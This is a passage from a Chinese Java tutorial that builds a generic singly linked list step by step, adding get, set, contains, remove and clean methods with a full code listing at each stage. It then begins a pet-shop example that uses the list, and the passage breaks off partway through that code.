-----------以下为Link类中定义的成员----------    private Node root; //保存根元素    private int count;//保存数据个数    private int foot;//描述的是操作数组的脚标    private Object[] returnData;//返回的数据保存    // -----------以下为Link类中定义的方法----------    @Override    public void add1(E e) &#123;        if (e == null) &#123;            return;        &#125;        //数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中        Node newNode = new Node(e);//创建一个新节点        if (this.root == null) &#123; //现在没有根节点            this.root = newNode; //现在第一个节点作为根节点        &#125; else &#123;            this.root.addNode(newNode);//将新节点保存在合适的位置        &#125;        this.count++;    &#125;    @Override    public int size1() &#123;        return this.count;    &#125;    @Override    public boolean isEmpty() &#123;        //return this.root == null;        return this.count == 0;    &#125;    @Override    public Object[] toArray() &#123;        if (this.isEmpty()) &#123;            return null;//无数据        &#125;        this.foot = 0;//脚标清0        this.returnData = new Object[this.count];//根据已有的长度开辟数组        this.root.toArrayNode();//利用Node类进行递归数据获取        return this.returnData;    &#125;&#125;public class Test64 &#123;    public static void main(String[] args) &#123;        ILink&lt;String&gt; all = new LinkImpl&lt;&gt;();        System.out.println(&quot;增加之前数据个数：&quot; + all.size1() + &quot;、是否为空集合：&quot; + all.isEmpty());        all.add1(&quot;hello&quot;);        all.add1(&quot;world&quot;);        all.add1(&quot;mes9s0&quot;);        System.out.println(&quot;增加之后数据个数：&quot; + all.size1() + &quot;、是否为空集合：&quot; + all.isEmpty());        Object[] result = all.toArray();        for (Object obj : result)&#123;            System.out.println(obj);        &#125;    &#125;&#125;\n\n\n​    集合的数据一般如果要返回肯定要以对象数组的形式返回。\n根据索引取得数据​    根据索引取得数据：public E get(int index)\n​    链表的可以像数组一样进行处理，所以也应该可以像数组一样进行索引数据的获取，在这样的情况下就可以继续利用递归的形式完成。\n\n​    1、在ILink的接口里追加新的方法\npublic E get(int index);//根据索引找到数据\n\n​    2、在Node类里面追加有根据索引获取数据的处理\npublic E getNode(int index) &#123;    if (LinkImpl.this.foot++ == index) &#123;        //索引相同        return this.data;    &#125; else &#123;        return this.next.getNode(index);    &#125;&#125;\n\n​    3、在LinkImpl子类里面定义数据获取的实现\n@Overridepublic E get(int index) &#123;    if (index &gt;= this.count) &#123;        return null;    &#125;    //索引数据的获取应该由Node类完成    this.foot = 0;//重置索引的下标    return this.root.getNode(index);&#125;\n\n范例：\npackage two;//链表数据增加interface ILink&lt;E&gt; &#123; //设置泛型避免安全隐患    public void add1(E e);//增加节点    public int size1();//获取数据个数    public boolean isEmpty();//判断空集合    public Object[] toArray();//将集合元素以数组形式返回    public E get(int index);//根据索引找到数据&#125;class LinkImpl&lt;E&gt; implements ILink&lt;E&gt; &#123;    //保存节点的数据关系    private class Node &#123;        private E data; //保存的数据        private Node next; //保存下一个引用        //限制node必须有数据，有数据才有意义        public Node(E data) &#123;            this.data = data;        &#125;        //第一次调用：this = LinkImpl.root;        //第二次调用：this = LinkImpl.root.next;        //第三次调用: this = LinkImpl.root.next.next;        public void addNode(Node newNode) &#123; //保存新的node数据            if (this.next == null) &#123;                this.next = newNode;            &#125; else &#123;                this.next.addNode(newNode);            &#125;        &#125;        //第一次调用:this = LinkImpl.root        //第二次调用:this = LinkImpl.root.next        //第三次调用: this = LinkImpl.root.next.next;        public void toArrayNode() &#123;            LinkImpl.this.returnData[LinkImpl.this.foot++] = this.data;            if (this.next != null) &#123;//还有下一个数据                this.next.toArrayNode();            &#125;        &#125;        public E getNode(int index) &#123;            if (LinkImpl.this.foot++ == index) &#123;                //索引相同                return this.data;            &#125; else &#123;                return this.next.getNode(index);            &#125;        &#125;    &#125;    // -----------以下为Link类中定义的成员----------    private Node root; //保存根元素    private int count;//保存数据个数    private int foot;//描述的是操作数组的脚标    private Object[] returnData;//返回的数据保存    // -----------以下为Link类中定义的方法----------    @Override    public void add1(E e) &#123;        if (e == null) &#123;            return;        &#125;        //数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中        Node newNode = new Node(e);//创建一个新节点        if (this.root == null) &#123; //现在没有根节点            this.root = newNode; //现在第一个节点作为根节点        &#125; else &#123;            this.root.addNode(newNode);//将新节点保存在合适的位置        &#125;        this.count++;    &#125;    @Override    public int size1() &#123;        return this.count;    &#125;    @Override    public boolean isEmpty() &#123;        //return this.root == null;        return this.count == 0;    &#125;    @Override    public Object[] toArray() &#123;        if (this.isEmpty()) &#123;            return null;//无数据        &#125;        this.foot = 0;//脚标清0        this.returnData = new Object[this.count];//根据已有的长度开辟数组        this.root.toArrayNode();//利用Node类进行递归数据获取        return this.returnData;    &#125;    @Override    public E get(int index) &#123;        if (index &gt;= this.count) &#123;            return null;        &#125;        //索引数据的获取应该由Node类完成        this.foot = 0;//重置索引的下标        return this.root.getNode(index);    &#125;&#125;public class Test64 &#123;    public static void main(String[] args) &#123;        ILink&lt;String&gt; all = new LinkImpl&lt;&gt;();        System.out.println(&quot;增加之前数据个数：&quot; + all.size1() + &quot;、是否为空集合：&quot; + all.isEmpty());        all.add1(&quot;hello&quot;);        all.add1(&quot;world&quot;);        all.add1(&quot;mes9s0&quot;);        System.out.println(&quot;增加之后数据个数：&quot; + all.size1() + &quot;、是否为空集合：&quot; + all.isEmpty());        Object[] result = all.toArray();        for (Object obj : result) &#123;            System.out.println(obj);        &#125;        System.out.println(&quot;--------------数据获取的分割线----------------&quot;);        System.out.println(all.get(0));        System.out.println(all.get(1));        System.out.println(all.get(4));    &#125;&#125;\n\n\n​    这一特点和数组是很相似的，但是需要注意的是，数组获取一个数据的时间复杂度为1，而链表获取数据的时间复杂度为n。\n链表（修改指定索引数据）​    修改指定索引数据：public void set(int index,E data)\n​    现在已经可以根据索引来获取指定的数据了，但是既然可以获取数据，那么也可以进行数据的修改。\n​    1、在ILink的接口中追加新的方法\npublic void set(int index,E data);//修改索引数据\n\n​    2、在Node类中应该提供有数据修改的处理支持\npublic void setNode(int index,E data)&#123;    if (LinkImpl.this.foot++ == index) &#123;        //索引相同        this.data = data;    &#125; else &#123;        this.next.setNode(index, data);    &#125;&#125;\n\n​    3、在LinkImpl的子类里面进行方法的覆写\npublic void set(int index, E data) &#123;    if (index &gt;= this.count) &#123;        return;//方法结束    &#125;    //索引数据的获取应该由Node类完成    this.foot = 0;//重置索引的下标    this.root.setNode(index, data);//修改数据&#125;\n\n范例：\npackage two;//链表数据增加interface ILink&lt;E&gt; &#123; //设置泛型避免安全隐患    public void add1(E e);//增加节点    public int size1();//获取数据个数    public boolean isEmpty();//判断空集合    public Object[] toArray();//将集合元素以数组形式返回    public E get(int index);//根据索引找到数据    public void set(int index, E data);//修改索引数据&#125;class LinkImpl&lt;E&gt; implements ILink&lt;E&gt; &#123;    //保存节点的数据关系    private class Node &#123;        private E data; //保存的数据        private Node next; //保存下一个引用        //限制node必须有数据，有数据才有意义        public Node(E data) &#123;            this.data = data;        &#125;        //第一次调用：this = LinkImpl.root;        //第二次调用：this = LinkImpl.root.next;        //第三次调用: this = LinkImpl.root.next.next;        public void addNode(Node newNode) &#123; //保存新的node数据            if (this.next == null) &#123;                this.next = newNode;            &#125; else &#123;                this.next.addNode(newNode);            &#125;        &#125;        //第一次调用:this = LinkImpl.root        //第二次调用:this = LinkImpl.root.next        //第三次调用: this = LinkImpl.root.next.next;        public void toArrayNode() &#123;            LinkImpl.this.returnData[LinkImpl.this.foot++] = this.data;            if (this.next != null) &#123;//还有下一个数据                this.next.toArrayNode();            &#125;        &#125;        public E getNode(int index) &#123;            if (LinkImpl.this.foot++ == index) &#123;                //索引相同                return this.data;            &#125; else &#123;                return this.next.getNode(index);            &#125;        &#125;        public void setNode(int index, E data) &#123;            if (LinkImpl.this.foot++ == index) &#123;                //索引相同                this.data = data;            &#125; else &#123;                this.next.setNode(index, data);            &#125;        &#125;    &#125;    // -----------以下为Link类中定义的成员----------    private Node root; //保存根元素    private int count;//保存数据个数    private int foot;//描述的是操作数组的脚标    private Object[] returnData;//返回的数据保存    // -----------以下为Link类中定义的方法----------    @Override    public void add1(E e) &#123;        if (e == null) &#123;            return;        &#125;        //数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中        Node newNode = new Node(e);//创建一个新节点        if (this.root == null) &#123; //现在没有根节点            this.root = newNode; //现在第一个节点作为根节点        &#125; else &#123;            this.root.addNode(newNode);//将新节点保存在合适的位置        &#125;        this.count++;    &#125;    @Override    public int size1() &#123;        return this.count;    &#125;    @Override    public boolean isEmpty() &#123;        //return this.root == null;        return this.count == 0;    &#125;    @Override    public Object[] toArray() &#123;        if (this.isEmpty()) &#123;            return null;//无数据        &#125;        this.foot = 0;//脚标清0        this.returnData = new Object[this.count];//根据已有的长度开辟数组        this.root.toArrayNode();//利用Node类进行递归数据获取        return this.returnData;    &#125;    @Override    public E get(int index) &#123;        if (index &gt;= this.count) &#123;            return null;        &#125;        //索引数据的获取应该由Node类完成        this.foot = 0;//重置索引的下标        return this.root.getNode(index);    &#125;    @Override    public void set(int index, E data) &#123;        if (index &gt;= this.count) &#123;            return;//方法结束        &#125;        //索引数据的获取应该由Node类完成        this.foot = 0;//重置索引的下标        this.root.setNode(index, data);//修改数据    &#125;&#125;public class Test64 &#123;    public static void main(String[] args) &#123;        ILink&lt;String&gt; all = new LinkImpl&lt;&gt;();        System.out.println(&quot;增加之前数据个数：&quot; + all.size1() + &quot;、是否为空集合：&quot; + all.isEmpty());        all.add1(&quot;hello&quot;);        all.add1(&quot;world&quot;);        all.add1(&quot;mes9s0&quot;);        all.set(1,&quot;世界&quot;);        System.out.println(&quot;增加之后数据个数：&quot; + all.size1() + &quot;、是否为空集合：&quot; + all.isEmpty());        Object[] result = all.toArray();        for (Object obj : result) &#123;            System.out.println(obj);        &#125;        System.out.println(&quot;--------------数据获取的分割线----------------&quot;);        System.out.println(all.get(0));        System.out.println(all.get(1));        System.out.println(all.get(4));    &#125;&#125;\n\n\n​    这种操作的时间复杂度也是n，因为依然需要数据的遍历处理。\n链表（判断数据是否存在）​    判断数据是否存在：public boolean contains(E data)\n​    在一个集合里往往会保存有大量的数据，有些时候需要判断某个数据是否存在，这个时候就可以通过对象比较的模式（equals()方法）来进行判断。\n​    1、在ILink接口中追加判断的方法\npublic boolean contains(E data);//判断数据是否存在\n\n​    2、在Node类中进行依次判断\npublic boolean containsNode(E data) &#123;    if (this.data.equals(data)) &#123;//对象比较        return true;    &#125; else &#123;        if (this.next == null) &#123;//无后续节点            return false;        &#125; else &#123;            return this.next.containsNode(data);//向后继续判断        &#125;    &#125;&#125;\n\n​    3、在LinkImpl的子类里实现该方法\npublic boolean contains(E data) &#123;    if (data == null)&#123;        return false;    &#125;    return this.root.containsNode(data);//交给Node类判断&#125;\n\n范例：\npackage two;//链表数据增加interface ILink&lt;E&gt; &#123; //设置泛型避免安全隐患    public void add1(E e);//增加节点    public int size1();//获取数据个数    public boolean isEmpty();//判断空集合    public Object[] toArray();//将集合元素以数组形式返回    public E get(int index);//根据索引找到数据    public void set(int index, E data);//修改索引数据    public boolean contains(E data);//判断数据是否存在&#125;class LinkImpl&lt;E&gt; implements ILink&lt;E&gt; &#123;    //保存节点的数据关系    private class Node &#123;        private E data; //保存的数据        private Node next; //保存下一个引用        //限制node必须有数据，有数据才有意义        public Node(E data) &#123;            this.data = data;        &#125;        //第一次调用：this = LinkImpl.root;        //第二次调用：this = LinkImpl.root.next;        //第三次调用: this = LinkImpl.root.next.next;        public void addNode(Node newNode) &#123; //保存新的node数据            if (this.next == null) &#123;                this.next = newNode;            &#125; else &#123;                this.next.addNode(newNode);            &#125;        &#125;        //第一次调用:this = LinkImpl.root        //第二次调用:this = LinkImpl.root.next        //第三次调用: this = LinkImpl.root.next.next;        public void toArrayNode() &#123;            LinkImpl.this.returnData[LinkImpl.this.foot++] = this.data;            if (this.next != null) &#123;//还有下一个数据                this.next.toArrayNode();            &#125;        &#125;        public E getNode(int index) &#123;            if (LinkImpl.this.foot++ == index) &#123;                //索引相同                return this.data;            &#125; else &#123;                return this.next.getNode(index);            &#125;        &#125;        public void setNode(int index, E data) &#123;            if (LinkImpl.this.foot++ == index) &#123;                //索引相同                this.data = data;            &#125; else &#123;                this.next.setNode(index, data);            &#125;        &#125;        public boolean containsNode(E data) &#123;            if (this.data.equals(data)) &#123;//对象比较                return true;            &#125; else &#123;                if (this.next == null) &#123;//无后续节点                    return false;                &#125; else &#123;                    return this.next.containsNode(data);//向后继续判断                &#125;            &#125;        &#125;    &#125;    // -----------以下为Link类中定义的成员----------    private Node root; //保存根元素    private int count;//保存数据个数    private int foot;//描述的是操作数组的脚标    private Object[] returnData;//返回的数据保存    // -----------以下为Link类中定义的方法----------    @Override    public void add1(E e) &#123;        if (e == null) &#123;            return;        &#125;        //数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中        Node newNode = new Node(e);//创建一个新节点        if (this.root == null) &#123; //现在没有根节点            this.root = newNode; //现在第一个节点作为根节点        &#125; else &#123;            this.root.addNode(newNode);//将新节点保存在合适的位置        &#125;        this.count++;    &#125;    @Override    public int size1() &#123;        return this.count;    &#125;    @Override    public boolean isEmpty() &#123;        //return this.root == null;        return this.count == 0;    &#125;    @Override    public Object[] toArray() &#123;        if (this.isEmpty()) &#123;            return null;//无数据        &#125;        this.foot = 0;//脚标清0        this.returnData = new Object[this.count];//根据已有的长度开辟数组        this.root.toArrayNode();//利用Node类进行递归数据获取        return this.returnData;    &#125;    @Override    public E get(int index) &#123;        if (index &gt;= this.count) &#123;            return null;        &#125;        //索引数据的获取应该由Node类完成        this.foot = 0;//重置索引的下标        return this.root.getNode(index);    &#125;    @Override    public void set(int index, E data) &#123;        if (index &gt;= this.count) &#123;            return;//方法结束        &#125;        //索引数据的获取应该由Node类完成        this.foot = 0;//重置索引的下标        this.root.setNode(index, data);//修改数据    &#125;    @Override    public boolean contains(E data) &#123;        if (data == null)&#123;            return false;        &#125;        return this.root.containsNode(data);//交给Node类判断    &#125;&#125;public class Test64 &#123;    public static void main(String[] args) &#123;        ILink&lt;String&gt; all = new LinkImpl&lt;&gt;();        System.out.println(&quot;增加之前数据个数：&quot; + all.size1() + &quot;、是否为空集合：&quot; + all.isEmpty());        all.add1(&quot;hello&quot;);        all.add1(&quot;world&quot;);        all.add1(&quot;mes9s0&quot;);        all.set(1, &quot;世界&quot;);        System.out.println(&quot;增加之后数据个数：&quot; + all.size1() + &quot;、是否为空集合：&quot; + all.isEmpty());        Object[] result = all.toArray();        for (Object obj : result) &#123;            System.out.println(obj);        &#125;        System.out.println(&quot;--------------数据获取的分割线----------------&quot;);        System.out.println(all.get(0));        System.out.println(all.get(1));        System.out.println(all.get(4));        System.out.println(&quot;--------------数据判断的分割线----------------&quot;);        System.out.println(all.contains(&quot;高&quot;));        System.out.println(all.contains(&quot;hello&quot;));    &#125;&#125;\n\n\n​    由于整个链表没有null数据的存在，所以整体的程序在判断的时候程序直接使用每一个的节点数据发出equals()的方法调用即可。注意要把不会为null的数据写在equals()方法的前面。\n链表（数据删除）​    public void remove(E data)\n​    数据的删除指的是可以从集合里面删除掉制定的一个数据内容，有就是说此时传递的是数据内容。删除操作依然需要对象比较的支持。但是对于集合数据的删除需要考虑两种情况：\n​    1、要删除的是根节点数据(LinkImpl与根节点有关，所以这个判断由根节点完成)：\n\n​    2、要删除的不是根节点数据(由Node类负责)：\n\n​    实现：\n​    1、在ILink接口里面追加新的删除方法\npublic void remove(E data);//数据删除方法\n\n​    2、在LinkImpl子类里面实现根节点的判断\n@Overridepublic void remove(E data) &#123;    if (this.contains(data)) &#123; //判断数据是否存在        if (this.root.data.equals(data)) &#123; //根节点为要删除节点            this.root = this.root.next;        &#125;        this.count--;    &#125;&#125;\n\n​    3、如果现在根节点并不是要删除的节点，那么就需要进行后续节点判断，但是请一定要记住，此时根节点已经判断完成，再判断应该从根节点下一个开始。在Node类中追加删除处理。\npublic void removeNode(Node previous,E data)&#123;    if (this.data.equals(data))&#123;        previous.next = this.next;//空出当前节点    &#125;else &#123;        if (this.next != null)&#123; //有后续节点            this.next.removeNode(this,data); //向后继续删除        &#125;    &#125;&#125;\n\n​    4、完善LinkImpl子类中的remove方法\n@Overridepublic void remove(E data) &#123;    if (this.contains(data)) &#123; //判断数据是否存在        if (this.root.data.equals(data)) &#123; //根节点为要删除节点            this.root = this.root.next; //根的下一个节点        &#125;else &#123; //交由Node类负责删除            this.root.next.removeNode(this.root,data);        &#125;        this.count--;    &#125;&#125;\n\n范例：\npackage two;//链表数据增加interface ILink&lt;E&gt; &#123; //设置泛型避免安全隐患    public void add1(E e);//增加节点    public int size1();//获取数据个数    public boolean isEmpty();//判断空集合    public Object[] toArray();//将集合元素以数组形式返回    public E get(int index);//根据索引找到数据    public void set(int index, E data);//修改索引数据    public boolean contains(E data);//判断数据是否存在    public void remove(E data);//数据删除方法&#125;class LinkImpl&lt;E&gt; implements ILink&lt;E&gt; &#123;    //保存节点的数据关系    private class Node &#123;        private E data; //保存的数据        private Node next; //保存下一个引用        //限制node必须有数据，有数据才有意义        public Node(E data) &#123;            this.data = data;        &#125;        //第一次调用：this = LinkImpl.root;        //第二次调用：this = LinkImpl.root.next;        //第三次调用: this = LinkImpl.root.next.next;        public void addNode(Node newNode) &#123; //保存新的node数据            if (this.next == null) &#123;                this.next = newNode;            &#125; else &#123;                this.next.addNode(newNode);            &#125;        &#125;        //第一次调用:this = LinkImpl.root        //第二次调用:this = LinkImpl.root.next        //第三次调用: this = LinkImpl.root.next.next;        public void toArrayNode() &#123;            LinkImpl.this.returnData[LinkImpl.this.foot++] = this.data;            if (this.next != null) &#123;//还有下一个数据                this.next.toArrayNode();            &#125;        &#125;        public E getNode(int index) &#123;            if (LinkImpl.this.foot++ == index) &#123;                //索引相同                return this.data;            &#125; else &#123;                return this.next.getNode(index);            &#125;        &#125;        public void setNode(int index, E data) &#123;            if (LinkImpl.this.foot++ == index) &#123;                //索引相同                this.data = data;            &#125; else &#123;                this.next.setNode(index, data);            &#125;        &#125;        public boolean containsNode(E data) &#123;            if (this.data.equals(data)) &#123;//对象比较                return true;            &#125; else &#123;                if (this.next == null) &#123;//无后续节点                    return false;                &#125; else &#123;                    return this.next.containsNode(data);//向后继续判断                &#125;            &#125;        &#125;        public void removeNode(Node previous, E data) &#123;            if (this.data.equals(data)) &#123;                previous.next = this.next;//空出当前节点            &#125; else &#123;                if (this.next != null) &#123; //有后续节点                    this.next.removeNode(this, data); //向后继续删除                &#125;            &#125;        &#125;    &#125;    // -----------以下为Link类中定义的成员----------    private Node root; //保存根元素    private int count;//保存数据个数    private int foot;//描述的是操作数组的脚标    private Object[] returnData;//返回的数据保存    // -----------以下为Link类中定义的方法----------    @Override    public void add1(E e) &#123;        if (e == null) &#123;            return;        &#125;        //数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中        Node newNode = new Node(e);//创建一个新节点        if (this.root == null) &#123; //现在没有根节点            this.root = newNode; //现在第一个节点作为根节点        &#125; else &#123;            this.root.addNode(newNode);//将新节点保存在合适的位置        &#125;        this.count++;    &#125;    @Override    public int size1() &#123;        return this.count;    &#125;    @Override    public boolean isEmpty() &#123;        //return this.root == null;        return this.count == 0;    &#125;    @Override    public Object[] toArray() &#123;        if (this.isEmpty()) &#123;            return null;//无数据        &#125;        this.foot = 0;//脚标清0        System.out.println(count);        this.returnData = new Object[this.count];//根据已有的长度开辟数组        this.root.toArrayNode();//利用Node类进行递归数据获取        return this.returnData;    &#125;    @Override    public E get(int index) &#123;        if (index &gt;= this.count) &#123;            return null;        &#125;        //索引数据的获取应该由Node类完成        this.foot = 0;//重置索引的下标        return this.root.getNode(index);    &#125;    @Override    public void set(int index, E data) &#123;        if (index &gt;= this.count) &#123;            return;//方法结束        &#125;        //索引数据的获取应该由Node类完成        this.foot = 0;//重置索引的下标        this.root.setNode(index, data);//修改数据    &#125;    @Override    public boolean contains(E data) &#123;        if (data == null) &#123;            return false;        &#125;        return this.root.containsNode(data);//交给Node类判断    &#125;    @Override    public void remove(E data) &#123;        if (this.contains(data)) &#123; //判断数据是否存在            if (this.root.data.equals(data)) &#123; //根节点为要删除节点                this.root = this.root.next; //根的下一个节点            &#125;else &#123; //交由Node类负责删除                this.root.next.removeNode(this.root,data);            &#125;            this.count--;        &#125;    &#125;&#125;public class Test64 &#123;    public static void main(String[] args) &#123;        ILink&lt;String&gt; all = new LinkImpl&lt;&gt;();        System.out.println(&quot;增加之前数据个数：&quot; + all.size1() + &quot;、是否为空集合：&quot; + all.isEmpty());        all.add1(&quot;hello&quot;);        all.add1(&quot;world&quot;);        all.add1(&quot;mes9s0&quot;);        System.out.println(&quot;增加之后数据个数：&quot; + all.size1() + &quot;、是否为空集合：&quot; + all.isEmpty());        all.remove(&quot;world&quot;);        System.out.println(&quot;删除之后数据个数：&quot;+all.size1());        Object[] result = all.toArray();        for (Object obj : result) &#123;            System.out.println(obj);        &#125;        System.out.println(&quot;--------------数据获取的分割线----------------&quot;);        System.out.println(all.get(0));        System.out.println(all.get(1));        System.out.println(&quot;--------------数据判断的分割线----------------&quot;);        System.out.println(all.contains(&quot;高&quot;));        System.out.println(all.contains(&quot;hello&quot;));    &#125;&#125;\n\n\n​    删除逻辑依靠的就是引用的改变处理完成的。\n链表（清空链表）​    清空链表:public void clean()\n​    有些时候需要进行链表数据的整体清空处理，这个时候就可以直接根据根元素来进行控制，只要root设置为了null，那么后续的节点就都不存在了。\n​    1、在ILink接口里面追加有清空处理方法\npublic void clean();//清空集合\n\n​    2、在LinkImpl子类里覆写\n@Overridepublic void clean() &#123;    this.root = null; //后续所有的都没了    this.count = 0; //个数清零&#125;\n\n范例：\npackage two;//链表interface ILink&lt;E&gt; &#123; //设置泛型避免安全隐患    public void add1(E e);//增加节点    public int size1();//获取数据个数    public boolean isEmpty();//判断空集合    public Object[] toArray();//将集合元素以数组形式返回    public E get(int index);//根据索引找到数据    public void set(int index, E data);//修改索引数据    public boolean contains(E data);//判断数据是否存在    public void remove(E data);//数据删除方法    public void clean();//清空集合&#125;class LinkImpl&lt;E&gt; implements ILink&lt;E&gt; &#123;    //保存节点的数据关系    private class Node &#123;        private E data; //保存的数据        private Node next; //保存下一个引用        //限制node必须有数据，有数据才有意义        public Node(E data) &#123;            this.data = data;        &#125;        //第一次调用：this = LinkImpl.root;        //第二次调用：this = LinkImpl.root.next;        //第三次调用: this = LinkImpl.root.next.next;        public void addNode(Node newNode) &#123; //保存新的node数据            if (this.next == null) &#123;                this.next = newNode;            &#125; else &#123;                this.next.addNode(newNode);            &#125;        &#125;        //第一次调用:this = LinkImpl.root        //第二次调用:this = LinkImpl.root.next        //第三次调用: this = LinkImpl.root.next.next;        public void toArrayNode() &#123;            LinkImpl.this.returnData[LinkImpl.this.foot++] = this.data;            if (this.next != null) &#123;//还有下一个数据                this.next.toArrayNode();            &#125;        &#125;        public E getNode(int index) &#123;            if (LinkImpl.this.foot++ == index) &#123;                //索引相同                return this.data;            &#125; else &#123;                return this.next.getNode(index);            &#125;        &#125;        public void setNode(int index, E data) &#123;            if (LinkImpl.this.foot++ == index) &#123;                //索引相同                this.data = data;            &#125; else &#123;                this.next.setNode(index, data);            &#125;        &#125;        public boolean containsNode(E data) &#123;            if (this.data.equals(data)) &#123;//对象比较                return true;            &#125; else &#123;                if (this.next == null) &#123;//无后续节点                    return false;                &#125; else &#123;                    return this.next.containsNode(data);//向后继续判断                &#125;            &#125;        &#125;        public void removeNode(Node previous, E data) &#123;            if (this.data.equals(data)) &#123;                previous.next = this.next;//空出当前节点            &#125; else &#123;                if (this.next != null) &#123; //有后续节点                    this.next.removeNode(this, data); //向后继续删除                &#125;            &#125;        &#125;    &#125;    // -----------以下为Link类中定义的成员----------    private Node root; //保存根元素    private int count;//保存数据个数    private int foot;//描述的是操作数组的脚标    private Object[] returnData;//返回的数据保存    // -----------以下为Link类中定义的方法----------    @Override    public void add1(E e) &#123;        if (e == null) &#123;            return;        &#125;        //数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中        Node newNode = new Node(e);//创建一个新节点        if (this.root == null) &#123; //现在没有根节点            this.root = newNode; //现在第一个节点作为根节点        &#125; else &#123;            this.root.addNode(newNode);//将新节点保存在合适的位置        &#125;        this.count++;    &#125;    @Override    public int size1() &#123;        return this.count;    &#125;    @Override    public boolean isEmpty() &#123;        //return this.root == null;        return this.count == 0;    &#125;    @Override    public Object[] toArray() &#123;        if (this.isEmpty()) &#123;            return null;//无数据        &#125;        this.foot = 0;//脚标清0        System.out.println(count);        this.returnData = new Object[this.count];//根据已有的长度开辟数组        this.root.toArrayNode();//利用Node类进行递归数据获取        return this.returnData;    &#125;    @Override    public E get(int index) &#123;        if (index &gt;= this.count) &#123;            return null;        &#125;        //索引数据的获取应该由Node类完成        this.foot = 0;//重置索引的下标        return this.root.getNode(index);    &#125;    @Override    public void set(int index, E data) &#123;        if (index &gt;= this.count) &#123;            return;//方法结束        &#125;        //索引数据的获取应该由Node类完成        this.foot = 0;//重置索引的下标        this.root.setNode(index, data);//修改数据    &#125;    @Override    public boolean contains(E data) &#123;        if (data == null) &#123;            return false;        &#125;        return this.root.containsNode(data);//交给Node类判断    &#125;    @Override    public void remove(E data) &#123;        if (this.contains(data)) &#123; //判断数据是否存在            if (this.root.data.equals(data)) &#123; //根节点为要删除节点                this.root = this.root.next; //根的下一个节点            &#125; else &#123; //交由Node类负责删除                this.root.next.removeNode(this.root, data);            &#125;            this.count--;        &#125;    &#125;    @Override    public void clean() &#123;        this.root = null; //后续所有的都没了        this.count = 0; //个数清零    &#125;&#125;public class Test64 &#123;    public static void main(String[] args) &#123;        ILink&lt;String&gt; all = new LinkImpl&lt;&gt;();        System.out.println(&quot;增加之前数据个数：&quot; + all.size1() + &quot;、是否为空集合：&quot; + all.isEmpty());        all.add1(&quot;hello&quot;);        all.add1(&quot;world&quot;);        all.add1(&quot;mes9s0&quot;);        System.out.println(&quot;增加之后数据个数：&quot; + all.size1() + &quot;、是否为空集合：&quot; + all.isEmpty());        all.remove(&quot;world&quot;);        System.out.println(&quot;删除之后数据个数：&quot; + all.size1());        all.clean();        System.out.println(&quot;清空之后：&quot; + all.size1());        Object[] result = all.toArray();        if (result != null) &#123;            for (Object obj : result) &#123;                System.out.println(obj);            &#125;        &#125;    &#125;&#125;\n\n\n​    这些就是链表的基本功能，当然，这只是一个最简单最基础的单向链表实现。\n链表综合实战：宠物商店​    现在假设有一个宠物商店，里面可以出售各种宠物，要求可以实现宠物的上架与下架处理，也可以根据关键字查询出宠物的信息\n\n​    1、应该定义出宠物的标准\ninterface Pet&#123;    public String getName1();//宠物名字    public String getColor1();//宠物颜色&#125;\n\n​    2、宠物商店应该以宠物的标准为主\nclass PetShop &#123; //宠物商店    private ILink1&lt;Pet&gt; allPets = new LinkImpl1&lt;&gt;(); //保存多个宠物信息    public void add1(Pet pet) &#123; //追加宠物，商品上架        this.allPets.add1(pet); //集合中保存对象    &#125;    public void delete1(Pet pet) &#123;        this.allPets.remove(pet);    &#125;    public ILink1&lt;Pet&gt; search(String keyword) &#123;        ILink1&lt;Pet&gt; searchResult = new LinkImpl1&lt;&gt;();//保存查询结果        Object result[] = this.allPets.toArray(); //获取全部数据        if (result != null) &#123;            for (Object obj : result) &#123;                Pet pet = (Pet) obj;                if (pet.getName1().contains(keyword) || pet.getColor1().contains(keyword)) &#123;                    searchResult.add1(pet);                &#125;            &#125;        &#125;        return searchResult;    &#125;&#125;\n\n​    3、根据宠物标准来定义宠物信息\nclass Cat implements Pet &#123;    private String name;    private String color;    public Cat(String name, String color) &#123;        this.name = name;        this.color = color;    &#125;    @Override    public String getName1() &#123;        return this.name;    &#125;    @Override    public String getColor1() &#123;        return this.color;    &#125;    public boolean equals(Object obj) &#123;        if (obj == null) &#123;            return false;        &#125;        if (!(obj instanceof Cat)) &#123;            return false;        &#125;        if (this == obj) &#123;            return true;        &#125;        Cat cat = (Cat) obj;        return this.name.equals(cat.name) &amp;&amp; this.color.equals(cat.color);    &#125;    public String toString() &#123;        return &quot;【宠物猫】名字&quot; + this.name + &quot;、颜色：&quot; + this.color;    &#125;&#125;\n\n​    4、实现宠物商店的操作\nPetShop shop = new PetShop();shop.add1(new Dog(&quot;黄斑狗&quot;,&quot;绿色&quot;));shop.add1(new Cat(&quot;小强猫&quot;,&quot;深绿色&quot;));shop.add1(new Dog(&quot;黄狗&quot;,&quot;黄色&quot;));shop.add1(new Dog(&quot;斑点狗&quot;,&quot;灰色&quot;));Object result[] = shop.search(&quot;黄&quot;).toArray();    for (Object obj : result)&#123;        System.out.println(obj);    &#125;\n\n范例：\npackage two;//链表实战宠物商店interface ILink1&lt;E&gt; &#123; //设置泛型避免安全隐患    public void add1(E e);//增加节点    public int size1();//获取数据个数    public boolean isEmpty();//判断空集合    public Object[] toArray();//将集合元素以数组形式返回    public E get(int index);//根据索引找到数据    public void set(int index, E data);//修改索引数据    public boolean contains(E data);//判断数据是否存在    public void remove(E data);//数据删除方法    public void clean();//清空集合&#125;class LinkImpl1&lt;E&gt; implements ILink1&lt;E&gt; &#123;    //保存节点的数据关系    private class Node &#123;        private E data; //保存的数据        private Node next; //保存下一个引用        //限制node必须有数据，有数据才有意义        public Node(E data) &#123;            this.data = data;        &#125;        //第一次调用：this = LinkImpl.root;        //第二次调用：this = LinkImpl.root.next;        //第三次调用: this = LinkImpl.root.next.next;        public void addNode(Node newNode) &#123; //保存新的node数据            if (this.next == null) &#123;                this.next = newNode;            &#125; else &#123;                this.next.addNode(newNode);            &#125;        &#125;        //第一次调用:this = LinkImpl.root        //第二次调用:this = LinkImpl.root.next        //第三次调用: this = LinkImpl.root.next.next;        public void toArrayNode() &#123;            LinkImpl1.this.returnData[LinkImpl1.this.foot++] = this.data;            if 